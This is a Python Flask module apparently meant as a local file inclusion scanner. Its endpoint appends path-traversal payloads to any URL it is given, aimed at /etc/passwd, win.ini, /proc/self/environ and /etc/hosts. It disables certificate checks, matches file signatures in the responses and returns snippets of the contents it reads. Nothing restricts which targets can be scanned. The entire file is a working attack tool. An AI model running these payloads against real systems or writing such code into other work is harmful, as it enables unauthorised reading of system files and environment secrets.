from flask import Blueprint, request, jsonify, send_from_directory
import requests
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

lfi_bp = Blueprint('lfi_bp', __name__)

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../etc/passwd",
    "../../windows/win.ini",
    "../../../../windows/win.ini",
    "../../proc/self/environ",
    "../../../../proc/self/environ",
    "../../etc/hosts",
    "../../../../etc/hosts"
]

LFI_SIGNATURES = {
    "passwd": "root:",
    "win.ini": "[extensions]",
    "environ": "PATH=",
    "hosts": "localhost"
}

@lfi_bp.route("/", methods=["GET"])
def serve_ui():
    folder_path = os.path.dirname(os.path.abspath(__file__))
    return send_from_directory(folder_path, "index.html")

@lfi_bp.route("/lfi-test", methods=["POST"])
def lfi_test():
    data = request.get_json()
    base_url = data.get("url", "").strip()

    if not base_url or "=" not in base_url:
        return jsonify({"error": "Enter a valid URL with parameter, e.g. http://site.com/page?file="}), 400

    findings = []

    for payload in LFI_PAYLOADS:
        try:
            target = base_url + payload
            res = requests.get(target, timeout=6, verify=False)
            text = res.text[:500]
            detected = [sig for sig, marker in LFI_SIGNATURES.items() if marker in res.text]

            findings.append({
                "payload": payload,
                "url": target,
                "status_code": res.status_code,
                "detected": detected,
                "snippet": text.replace("\n", "\\n"),
                "vulnerable": len(detected) > 0
            })
        except Exception as e:
            findings.append({
                "payload": payload,
                "url": base_url + payload,
                "error": str(e),
                "vulnerable": False
            })

    return jsonify({"results": findings})
